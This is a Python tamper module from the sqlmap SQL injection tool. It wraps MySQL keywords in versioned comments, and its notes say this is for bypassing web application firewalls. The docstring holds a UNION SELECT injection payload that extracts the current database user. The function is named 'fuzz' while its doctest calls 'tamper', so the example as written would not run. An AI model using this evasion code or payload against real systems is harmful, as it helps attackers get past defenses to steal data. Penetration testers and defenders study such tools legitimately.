#!/usr/bin/env python

"""
Copyright (c) 2006-2017 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

import re

def fuzz(payload, **kwargs):
    """
    Encloses each non-function keyword with versioned MySQL comment

    Requirement:
        * MySQL

    Tested against:
        * MySQL 4.0.18, 5.1.56, 5.5.11

    Notes:
        * Useful to bypass several web application firewalls when the
          back-end database management system is MySQL

    >>> tamper('1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#')
    '1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS*//*!CHAR*/),CHAR(32)),CHAR(58,100,114,117,58))#'
    """

    def process(match):
        word = match.group('word')

        return match.group().replace(word, "/*!%s*/" % word)
        
    retVal = payload

    if payload:
        retVal = re.sub(r"(?<=\W)(?P<word>[A-Za-z_]+)(?=[^\w(]|\Z)", lambda match: process(match), retVal)
        retVal = retVal.replace(" /*!", "/*!").replace("*/ ", "*/")

    return retVal
